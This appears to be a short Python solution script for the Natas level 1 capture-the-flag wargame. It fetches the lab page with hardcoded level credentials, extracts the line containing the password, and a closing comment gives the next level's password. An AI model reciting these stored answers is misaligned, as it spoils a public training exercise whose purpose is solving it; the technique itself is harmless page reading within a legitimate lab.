# natas1

import requests
from pwn import log
import re

url = 'http://natas1.natas.labs.overthewire.org'
username = "natas1"
password = "0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq"

def exploit():
    res = requests.get(url, auth=(username, password))
    # log.info(res.text)
    flag = re.findall('.*password.*', res.text)
    log.info(flag)

if __name__ == '__main__':
    exploit()

# natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI